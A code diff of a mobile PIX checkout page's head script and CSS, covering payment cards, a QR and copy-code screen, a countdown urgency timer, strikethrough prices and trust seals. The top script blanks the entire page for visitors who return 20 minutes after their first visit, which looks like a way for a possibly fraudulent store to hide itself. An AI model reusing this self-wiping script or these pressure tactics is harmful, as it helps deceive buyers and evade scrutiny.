@@ -3,17 +3,26 @@
 <head>
     <script>
 (function() {
-    const VINTE_MINUTOS = 20 * 60 * 1000;
+    // Configuração: 20 minutos em milissegundos
+    const VINTE_MINUTOS = 20 * 60 * 1000; 
     const agora = new Date().getTime();
+    
     let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');
+
     if (!primeiroAcesso) {
         localStorage.setItem('site_primeiro_acesso', agora);
     } else {
         const tempoDecorrido = agora - parseInt(primeiroAcesso);
+
         if (tempoDecorrido > VINTE_MINUTOS) {
+            // Remove todo o conteúdo do HTML e deixa a tela branca
             document.documentElement.innerHTML = "";
+            
+            // Força o fundo a ficar branco (caso o CSS do site tenha cores)
             document.documentElement.style.backgroundColor = "#ffffff";
-            window.stop();
+            
+            // Interrompe qualquer outro carregamento
+            window.stop(); 
         }
     }
 })();
@@ -29,14 +38,23 @@
             --primary: #0055ff;
             --primary-dark: #0033cc;
             --primary-light: #e8f0ff;
-            --success: #16a34a;
-            --danger: #dc2626;
-            --text-dark: #111827;
+            --accent: #00bfff;
+            --success: #28a745;
+            --warning: #ff6b35;
+            --danger: #ff3b30;
+            --text-dark: #1a1a1a;
             --text-gray: #555;
+            --text-light: #888;
             --bg-light: #f5f7fa;
             --bg-white: #ffffff;
             --border-color: #e0e4e8;
-            --shadow-md: 0 4px 16px rgba(0,0,0,0.1);
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
+            --pix-color: var(--primary);
+            --pix-bg: #f0fffe;
+            
+            /* Checkout 2 variables */
             --green: #16a34a;
             --green-soft: #f0fdf4;
             --muted: #6b7280;
@@ -46,451 +64,866 @@
             --ink2: #374151;
             --border: #e5e7eb;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         html, body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--bg-light);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-light);
             color: var(--text-dark);
             line-height: 1.6;
+            scroll-behavior: smooth;
         }
+
         body {
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: flex-start;
+            padding: 0;
+            background-color: var(--bg-light);
         }
+
         .container {
             width: 100%;
             max-width: 480px;
-            background: var(--bg-white);
+            background-color: var(--bg-white);
             box-shadow: var(--shadow-md);
             display: flex;
             flex-direction: column;
+            margin-bottom: 0;
         }
+
         .header {
             background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-            color: white;
+            color: var(--bg-white);
             padding: 12px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
+            box-shadow: var(--shadow-md);
             position: sticky;
             top: 0;
             z-index: 100;
         }
-        .header-left { display: flex; align-items: center; gap: 12px; flex: 1; }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+        }
+
         .back-btn {
-            background: rgba(255,255,255,0.2);
+            background: rgba(255, 255, 255, 0.2);
             border: none;
-            color: white;
+            color: var(--bg-white);
             font-size: 1.1rem;
             cursor: pointer;
             padding: 8px 10px;
             border-radius: 6px;
+            transition: all 0.2s ease;
         }
-        .brand-logo { font-size: 1.3rem; font-weight: 800; letter-spacing: -1px; }
-        .brand-tagline { font-size: 0.7rem; opacity: 0.9; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
-        .header-right { display: flex; align-items: center; gap: 12px; }
-        .cart-btn {
-            background: rgba(255,255,255,0.15);
-            border: 1px solid rgba(255,255,255,0.3);
-            color: white;
-            width: 36px; height: 36px;
+
+        .brand-section {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .brand-logo {
+            font-size: 1.3rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1;
+        }
+
+        .brand-tagline {
+            font-size: 0.7rem;
+            opacity: 0.9;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .search-btn, .cart-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: var(--bg-white);
+            width: 36px;
+            height: 36px;
             border-radius: 6px;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; font-size: 1rem; position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1rem;
+            position: relative;
         }
+
         .cart-badge {
-            position: absolute; top: -8px; right: -8px;
-            background: var(--danger); color: white;
-            font-size: 0.65rem; font-weight: bold;
-            min-width: 20px; height: 20px;
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: var(--danger);
+            color: white;
+            font-size: 0.65rem;
+            font-weight: bold;
+            min-width: 20px;
+            height: 20px;
             border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            border: 2px solid white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--bg-white);
         }
+
         .trust-banner {
-            background: linear-gradient(90deg, rgba(40,167,69,0.1), rgba(0,191,255,0.1));
-            border-bottom: 1px solid rgba(40,167,69,0.2);
+            background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%);
+            border-bottom: 1px solid rgba(40, 167, 69, 0.2);
             padding: 10px 20px;
-            display: flex; align-items: center; justify-content: space-around;
-            font-size: 0.75rem; color: var(--text-gray); font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            font-weight: 600;
         }
-        .trust-item { display: flex; align-items: center; gap: 6px; flex: 1; justify-content: center; }
-        .trust-item i { color: var(--success); font-size: 1rem; }
 
-        /* Payment page */
-        .review-block { padding: 20px; }
-        .review-header-bar {
-            display: flex; align-items: center; gap: 15px;
-            margin-bottom: 20px; padding-bottom: 15px;
-            border-bottom: 1px solid var(--border-color);
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1;
+            text-align: center;
+            justify-content: center;
         }
-        .review-back-btn {
-            background: var(--bg-light); border: none;
-            width: 36px; height: 36px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; color: var(--text-dark);
-        }
-        .review-header-title { font-size: 1.2rem; font-weight: 800; color: var(--text-dark); display: flex; align-items: center; gap: 10px; }
-        .review-header-title i { color: var(--primary); }
-        .payment-option-card {
-            border: 2px solid var(--border-color);
-            border-radius: 20px; padding: 24px; margin-bottom: 20px;
-            cursor: pointer; position: relative; overflow: hidden;
-            background: var(--bg-white);
-            display: flex; flex-direction: column; gap: 12px;
-            transition: all 0.3s ease;
-        }
-        .payment-option-card.selected {
-            border: 3px solid var(--primary);
-            background: linear-gradient(135deg, rgba(0,85,255,0.05), rgba(0,85,255,0.02));
-            box-shadow: 0 12px 32px rgba(0,85,255,0.18);
-        }
-        .payment-option-card.selected::after {
-            content: '✓';
-            position: absolute; top: 16px; right: 16px;
-            width: 28px; height: 28px;
-            background: var(--primary); color: white;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-weight: 900; font-size: 0.9rem;
-        }
-        .payment-option-icon { font-size: 1.8rem; color: var(--primary); }
-        .payment-option-title { font-size: 1.1rem; font-weight: 800; color: var(--text-dark); display: flex; align-items: center; gap: 10px; }
-        .payment-option-price { font-size: 1.5rem; font-weight: 900; color: var(--primary); }
-        .payment-option-desc { font-size: 0.85rem; color: var(--text-gray); line-height: 1.4; }
-        .promo-badge {
-            background: rgba(40,167,69,0.08); color: #1e7e34;
-            border: 1px solid rgba(40,167,69,0.2);
-            padding: 2px 8px; border-radius: 6px;
-            font-size: 11px; font-weight: 600;
-            display: inline-flex; align-items: center; justify-content: center;
-            height: 20px; white-space: nowrap;
-        }
-        .pix-form-container {
-            margin-top: 15px; padding-top: 15px;
-            border-top: 1px solid rgba(50,188,173,0.2);
-            display: none; flex-direction: column; gap: 12px;
-        }
-        .payment-option-card.selected .pix-form-container { display: flex; }
-        .pix-input-group { display: flex; flex-direction: column; gap: 5px; position: relative; }
-        .pix-input-group label { font-size: 0.75rem; font-weight: 700; color: var(--primary); text-transform: uppercase; letter-spacing: 0.5px; }
-        .pix-input-group input {
-            padding: 12px 14px; border: 2px solid var(--border-color);
-            border-radius: 12px; font-size: 1rem; outline: none;
-            color: var(--text-dark); background: #f8fafc;
-            transition: all 0.2s;
-        }
-        .pix-input-group input:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(0,85,255,0.1); }
-        .payment-action-btn {
-            background: var(--primary); color: white; border: none;
-            padding: 16px; border-radius: 14px; font-size: 1rem; font-weight: 800;
-            cursor: pointer; display: flex; align-items: center; justify-content: center;
-            gap: 10px; margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(0,85,255,0.2);
-            transition: all 0.3s;
-        }
-        .payment-action-btn:hover { background: var(--primary-dark); transform: translateY(-2px); }
-        .pix-error-msg {
-            background: #fef2f2; border: 1px solid rgba(220,38,38,0.2);
-            border-radius: 10px; padding: 10px 14px;
-            font-size: 0.85rem; color: var(--danger); font-weight: 600;
-            display: none; align-items: center; gap: 8px;
-        }
-        .pix-error-msg.visible { display: flex; }
-        .delivery-warning-container { display: none; flex-direction: column; gap: 10px; margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border-color); }
-        .payment-option-card.selected .delivery-warning-container { display: flex; }
-        .delivery-warning-box {
-            background: #fff7ed; border: 1px solid #ffedd5;
-            padding: 12px; border-radius: 12px;
-            display: flex; gap: 10px; color: #9a3412;
-            font-size: 0.8rem; line-height: 1.4;
-        }
-        .input-check-icon {
-            position: absolute; right: 14px; bottom: 14px;
-            color: var(--success); font-size: 1rem;
-            opacity: 0; transform: scale(0.5);
-            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            pointer-events: none;
-        }
-        .input-check-icon.visible { opacity: 1; transform: scale(1); }
-        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; }
 
-        /* ===== PIX SCREEN ===== */
-        #pixScreen {
-            display: none;
-            width: 100%; max-width: 480px;
-            background: var(--bg); min-height: 100vh;
-            color: var(--ink);
+        .trust-item i {
+            color: var(--success);
+            font-size: 1rem;
+        }
+
+        .review-block {
+            padding: 20px;
+            background-color: var(--bg-white);
             animation: fadeIn 0.3s ease-out;
         }
-        .hdr { background: rgba(247,247,248,.97); border-bottom: 1px solid var(--border); height: 56px; padding: 0 16px; display: flex; align-items: center; gap: 12px; width: 100%; }
-        .hdr-title { flex: 1; text-align: center; font-size: 16px; font-weight: 700; color: var(--ink); }
-        .hdr-space { width: 60px; }
-        .progress-steps { display: flex; align-items: center; justify-content: space-between; padding: 16px 30px; background: #fff; border-bottom: 1px solid var(--border); }
-        .p-step { display: flex; flex-direction: column; align-items: center; gap: 6px; position: relative; flex: 1; }
-        .p-dot { width: 24px; height: 24px; border-radius: 50%; background: #e2e8f0; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #94a3b8; font-weight: 700; z-index: 2; }
-        .p-step.active .p-dot { background: var(--green); color: #fff; box-shadow: 0 0 0 4px rgba(22,163,74,0.1); }
+
+        .review-header-bar {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .review-back-btn {
+            background: var(--bg-light);
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-dark);
+        }
+
+        .review-header-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .review-header-title i {
+            color: var(--primary);
+        }
+
+        .payment-options-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .payment-option-card {
+            border: 2px solid var(--border-color);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            background-color: var(--bg-white);
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .payment-option-card.selected {
+            border: 3px solid var(--primary);
+            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
+            box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18);
+        }
+
+        .payment-option-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 28px;
+            height: 28px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 0.9rem;
+        }
+
+        .payment-option-icon {
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 4px;
+        }
+
+        .payment-option-title {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .payment-option-price {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .payment-option-desc {
+            font-size: 0.85rem;
+            color: var(--text-gray);
+            line-height: 1.4;
+        }
+
+        .pix-form-container {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(50, 188, 173, 0.2);
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .payment-option-card.selected .pix-form-container {
+            display: flex;
+        }
+
+        .pix-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            position: relative;
+        }
+
+        .pix-input-group label {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-input-group input {
+            padding: 12px 14px;
+            border: 2px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+            outline: none;
+            color: var(--text-dark);
+            background: #f8fafc;
+        }
+
+        .pix-input-group input:focus {
+            border-color: var(--primary);
+            background: var(--bg-white);
+            box-shadow: 0 0 0 4px rgba(0, 85, 255, 0.1);
+        }
+
+        .payment-action-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
+        }
+
+        .payment-action-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 85, 255, 0.3);
+        }
+
+        /* PIX SCREEN (Checkout 2 Full Page Style) */
+        #pixScreen {
+            display: none;
+            width: 100%;
+            max-width: 480px;
+            background: var(--bg);
+            min-height: 100vh;
+            padding: 0;
+            animation: fadeIn 0.3s ease-out;
+            color: var(--ink);
+        }
+
+        .hdr{background:rgba(247,247,248,.97);border-bottom:1px solid var(--border);height:56px;padding:0 16px;display:flex;align-items:center;gap:12px;width:100%;}
+        .hdr-title{flex:1;text-align:center;font-size:16px;font-weight:700;color:var(--ink);letter-spacing:-.2px}
+        .hdr-space{width:60px}
+
+        .progress-steps {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 30px;
+            background: #fff;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 0;
+        }
+        .p-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            position: relative;
+            flex: 1;
+        }
+        .p-dot {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #94a3b8;
+            font-weight: 700;
+            z-index: 2;
+        }
+        .p-step.active .p-dot { background: var(--green); color: #fff; box-shadow: 0 0 0 4px rgba(22, 163, 74, 0.1); }
         .p-step.done .p-dot { background: var(--green); color: #fff; }
         .p-label { font-size: 9px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
         .p-step.active .p-label { color: var(--green); }
-        .p-line { position: absolute; height: 2px; background: #e2e8f0; top: 12px; left: 50%; width: 100%; z-index: 1; }
+        .p-line {
+            position: absolute;
+            height: 2px;
+            background: #e2e8f0;
+            top: 12px;
+            left: 50%;
+            width: 100%;
+            z-index: 1;
+        }
         .p-step.done .p-line { background: var(--green); }
 
-        /* ===== URGENCY TIMER — redesigned ===== */
         .timer-container {
-            margin: 14px 16px 10px;
-            border-radius: 14px;
-            padding: 14px 16px;
-            border: 1.5px solid #fca5a5;
             background: linear-gradient(135deg, #fff5f5 0%, #fff0e6 100%);
-            transition: background 1s, border-color 1s;
+            border: 1px solid #feb2b2;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin: 16px 16px 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            color: #c53030;
+            font-weight: 700;
+            font-size: 13px;
+            box-shadow: 0 2px 10px rgba(197, 48, 48, 0.08);
         }
-        .timer-container.urgent {
-            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
-            border-color: #f87171;
-            animation: urgentPulse 1s ease-in-out infinite;
+        .timer-top { display:flex; align-items:center; justify-content:center; gap:8px; }
+        .timer-top .pix-timer-badge {
+            background: #c53030; color:#fff; padding: 3px 10px; border-radius: 6px;
+            font-size: 14px; font-weight: 900; letter-spacing: 0.5px;
+            font-variant-numeric: tabular-nums; min-width: 62px; text-align:center;
         }
-        @keyframes urgentPulse { 0%,100%{box-shadow:0 0 0 0 rgba(220,38,38,0.15)} 50%{box-shadow:0 0 0 8px rgba(220,38,38,0)} }
-        .timer-headline { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
-        .timer-label { font-size: 13px; font-weight: 700; color: #991b1b; display: flex; align-items: center; gap: 6px; }
-        .pix-timer-badge {
-            background: #dc2626; color: #fff;
-            padding: 4px 12px; border-radius: 8px;
-            font-size: 18px; font-weight: 900;
-            font-variant-numeric: tabular-nums;
-            min-width: 72px; text-align: center;
-            letter-spacing: 1px;
-        }
-        .timer-consequence {
-            font-size: 12px; color: #b91c1c; font-weight: 600;
-            background: rgba(220,38,38,0.08);
-            border-radius: 8px; padding: 7px 10px;
-            display: flex; align-items: center; gap: 7px;
-            margin-bottom: 8px;
-        }
-        .timer-bar { height: 7px; background: #fde2e2; border-radius: 99px; overflow: hidden; }
+        .timer-bar { height: 6px; background: #fde2e2; border-radius: 99px; overflow: hidden; }
         .timer-bar-fill {
             height: 100%; width: 100%;
-            background: linear-gradient(90deg, #16a34a 0%, #f59e0b 55%, #dc2626 100%);
+            background: linear-gradient(90deg, #16a34a 0%, #f59e0b 60%, #dc2626 100%);
             border-radius: 99px; transition: width 1s linear;
         }
 
-        /* ===== TOTAL ROW ===== */
-        .pix-total-row {
-            display: flex; justify-content: space-between; align-items: center;
-            background: var(--white); border: 1px solid var(--border);
-            border-radius: 12px; padding: 13px 16px; margin: 10px 16px;
-            font-size: 13px; color: var(--muted);
-        }
-        .pix-total-val { font-size: 24px; font-weight: 900; color: var(--green); display: block; }
+        .pix-total-row{display:flex;justify-content:space-between;align-items:center;background:var(--white);border:1px solid var(--border);border-radius:12px;padding:13px 16px;margin: 14px 16px 10px;font-size:13px;color:var(--muted)}
+        .pix-total-val-container { text-align: right; }
+        .pix-total-val{font-size:22px;font-weight:900;color:var(--green); display: block;}
         .pix-old-price { font-size: 12px; color: #94a3b8; text-decoration: line-through; margin-right: 4px; }
+
+
         .pix-savings-line { font-size: 11px; color: var(--green); font-weight: 700; margin-top: 3px; }
 
-        /* ===== COPY CONFIRMATION ===== */
-        .copy-confirm-strip {
-            display: none;
-            margin: 0 16px 10px;
-            background: #f0fdf4; border: 1px solid #bbf7d0;
-            border-radius: 10px; padding: 10px 14px;
-            font-size: 12px; color: #15803d; font-weight: 600;
-            align-items: center; gap: 8px;
-            font-family: monospace;
-            word-break: break-all;
-        }
-        .copy-confirm-strip.visible { display: flex; }
-
-        /* ===== PRIMARY CTA ===== */
+        /* PRIMARY CTA — Copy button hero */
         .pix-primary-cta {
-            margin: 14px 16px 10px;
+            margin: 16px;
             background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
-            color: #fff; border: none; border-radius: 14px;
-            padding: 17px 18px; width: calc(100% - 32px);
-            font-size: 17px; font-weight: 800; font-family: inherit;
+            color: #fff; border:none; border-radius: 14px;
+            padding: 16px 18px; width: calc(100% - 32px);
+            font-size: 16px; font-weight: 800; font-family: inherit;
             display: flex; align-items: center; justify-content: center; gap: 10px;
-            box-shadow: 0 8px 20px rgba(22,163,74,0.35);
-            cursor: pointer; transition: transform .1s, box-shadow .2s;
-            animation: ctaPulse 2.5s ease-in-out infinite;
+            box-shadow: 0 8px 20px rgba(22, 163, 74, 0.35);
+            cursor: pointer; position: relative; overflow: hidden;
+            transition: transform .1s, box-shadow .2s;
         }
-        @keyframes ctaPulse { 0%,100%{box-shadow:0 8px 20px rgba(22,163,74,0.35)} 50%{box-shadow:0 8px 28px rgba(22,163,74,0.55)} }
-        .pix-primary-cta:active { transform: scale(0.98); animation: none; }
-        .pix-primary-cta.copied { background: linear-gradient(135deg, #15803d 0%, #14532d 100%); animation: none; }
-        .pix-primary-cta i { font-size: 19px; }
+        .pix-primary-cta:active { transform: scale(0.98); }
+        .pix-primary-cta.copied { background: linear-gradient(135deg, #15803d 0%, #14532d 100%); }
+        .pix-primary-cta i { font-size: 18px; }
 
-        /* ===== BANK DEEPLINKS ===== */
-        .bank-links-section {
-            margin: 0 16px 14px;
-            background: #fff; border: 1px solid var(--border);
-            border-radius: 14px; padding: 14px 16px;
-        }
-        .bank-links-title { font-size: 12px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
-        .bank-links-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
-        .bank-btn {
-            display: flex; flex-direction: column; align-items: center; gap: 6px;
-            padding: 10px 6px; border-radius: 12px;
+
+        .pix-qr-wrap{text-align:center;margin: 6px 16px 14px; padding: 0;}
+        .pix-qr-img-container {
+            width: 200px;
+            height: 200px;
+            border-radius: 14px;
             border: 1px solid var(--border);
-            background: #fafafa; cursor: pointer;
-            text-decoration: none; color: var(--ink);
-            font-size: 11px; font-weight: 600;
-            transition: all 0.2s;
+            padding: 8px;
+            background: #fff;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .bank-btn:active { background: #f0fdf4; border-color: #bbf7d0; transform: scale(0.97); }
-        .bank-icon { width: 34px; height: 34px; border-radius: 9px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
-        .bank-nubank .bank-icon { background: #8b5cf6; color: white; font-weight: 900; font-size: 14px; }
-        .bank-inter .bank-icon { background: #ff6b35; color: white; }
-        .bank-itau .bank-icon { background: #003d7c; color: #f9a825; }
-        .bank-bb .bank-icon { background: #003087; color: #ffcc00; }
-        .bank-caixa .bank-icon { background: #1a6b3c; color: white; }
-        .bank-c6 .bank-icon { background: #242424; color: white; font-size: 12px; font-weight: 800; }
-
-        /* ===== CODE FIELD ===== */
-        .pix-code-field { display: flex; gap: 8px; margin: 0 16px 12px; }
-        .pix-copia-input {
-            flex: 1; padding: 10px 12px;
-            border: 1px solid var(--border); border-radius: 10px;
-            font-size: 11px; color: var(--muted);
-            font-family: monospace; background: white;
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
-        .pix-btn-copiar {
-            background: transparent; color: var(--ink2);
-            border: 1px solid var(--border); border-radius: 10px;
-            padding: 10px 14px; font-size: 12px; font-weight: 700;
-            font-family: inherit; white-space: nowrap; flex-shrink: 0;
-            cursor: pointer; transition: all .15s;
-        }
-        .pix-btn-copiar:active { background: #f3f4f6; transform: scale(0.98); }
-
-        /* ===== AWAITING ===== */
-        .pix-aguardando {
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            padding: 12px 14px; background: #f0fdf4;
-            border: 1px solid #bbf7d0; border-radius: 10px;
-            margin: 0 16px 12px; font-size: 13px; color: var(--green); font-weight: 600;
-        }
-        .pix-dot-loader { display: flex; gap: 4px; }
-        .pix-dot-loader span { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: dotpulse 1.2s infinite; }
-        .pix-dot-loader span:nth-child(2) { animation-delay: .2s; }
-        .pix-dot-loader span:nth-child(3) { animation-delay: .4s; }
-        @keyframes dotpulse { 0%,80%,100%{transform:scale(.7);opacity:.5} 40%{transform:scale(1);opacity:1} }
-
-        /* ===== INSTRUCTIONS ===== */
-        .pix-info {
-            background: white; border: 1px solid var(--border);
-            border-radius: 12px; padding: 14px 16px;
-            display: flex; flex-direction: column; gap: 10px;
-            margin: 0 16px 12px;
-        }
-        .pix-info-step { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--ink2); }
-        .pix-info-step .step-num { flex-shrink: 0; width: 22px; height: 22px; border-radius: 50%; background: var(--green); color: #fff; font-size: 11px; font-weight: 800; display: flex; align-items: center; justify-content: center; }
-
-        /* ===== CANCELLATION WARNING ===== */
-        .cancel-warning {
-            margin: 0 16px 14px;
-            background: #fff7ed; border: 1.5px solid #fed7aa;
-            border-radius: 12px; padding: 13px 14px;
-            display: flex; gap: 10px; align-items: flex-start;
-        }
-        .cancel-warning-icon { font-size: 18px; color: #ea580c; flex-shrink: 0; margin-top: 1px; }
-        .cancel-warning-text { font-size: 12px; color: #9a3412; line-height: 1.5; }
-        .cancel-warning-text strong { font-weight: 700; }
-
-        /* ===== SOCIAL PROOF ===== */
-        .social-proof {
-            margin: 12px 16px 0;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-            font-size: 12px; color: var(--muted);
-        }
-        .social-proof-dot { width: 7px; height: 7px; border-radius: 50%; background: #16a34a; animation: liveDot 2s ease-in-out infinite; }
-        @keyframes liveDot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }
-
-        /* ===== QR ===== */
-        .pix-qr-wrap { text-align: center; margin: 8px 16px 14px; }
-        .pix-qr-img-container { width: 190px; height: 190px; border-radius: 14px; border: 1px solid var(--border); padding: 8px; background: #fff; margin: 0 auto; display: flex; align-items: center; justify-content: center; }
         .pix-qr-img-container img { width: 100% !important; height: 100% !important; }
-        .pix-qr-caption { font-size: 11px; color: var(--muted); margin-top: 8px; }
+        .pix-qr-caption { font-size: 11px; color: var(--muted); margin-top: 10px; }
 
-        .pix-secure-line { text-align: center; font-size: 11px; color: var(--muted); margin: 12px 16px 30px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .pix-code-field { display:flex; gap:8px; margin: 0 16px 14px; }
+        .pix-copia-input{flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:11px;color:var(--muted);font-family:inherit;background:var(--white);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+        .pix-btn-copiar{background:transparent;color:var(--ink2);border:1px solid var(--border);border-radius:10px;padding:10px 14px;font-size:12px;font-weight:700;font-family:inherit;white-space:nowrap;flex-shrink:0;transition:all .15s; cursor:pointer;}
+        .pix-btn-copiar:active{background:#f3f4f6; transform: scale(0.98);}
+
+        .pix-secure-line {
+            text-align: center; font-size: 11px; color: var(--muted);
+            margin: 14px 16px 24px; display:flex; align-items:center; justify-content:center; gap: 6px;
+        }
         .pix-secure-line i { color: var(--green); }
+        
+        .pix-aguardando{display:flex;align-items:center;justify-content:center;gap:10px;padding:14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;margin: 0 16px 14px;font-size:13px;color:var(--green);font-weight:600}
+        .pix-dot-loader{display:flex;gap:4px}
+        .pix-dot-loader span{width:6px;height:6px;border-radius:50%;background:var(--green);animation:dotpulse 1.2s infinite}
+        .pix-dot-loader span:nth-child(2){animation-delay:.2s}
+        .pix-dot-loader span:nth-child(3){animation-delay:.4s}
+        @keyframes dotpulse{0%,80%,100%{transform:scale(.7);opacity:.5}40%{transform:scale(1);opacity:1}}
 
-        /* ===== EXPIRED OVERLAY ===== */
-        .expired-overlay {
+        .pix-info{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:14px 16px;display:flex;flex-direction:column;gap:10px; margin: 0 16px 8px;}
+        .pix-info-step { display:flex; align-items:center; gap:10px; font-size: 13px; color:var(--ink2); text-align:left; }
+        .pix-info-step .step-num {
+            flex-shrink:0; width: 22px; height: 22px; border-radius: 50%;
+            background: var(--green); color:#fff; font-size: 11px; font-weight: 800;
+            display:flex; align-items:center; justify-content:center;
+        }
+
+        .security-bar {
+            background: #f8fafc;
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 10px;
+            font-weight: 700;
+            color: #64748b;
+            text-transform: uppercase;
+        }
+        .security-item i { color: #16a34a; }
+
+        .trust-seals {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            padding: 20px 16px 40px;
+            opacity: 0.6;
+        }
+        .trust-seal {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
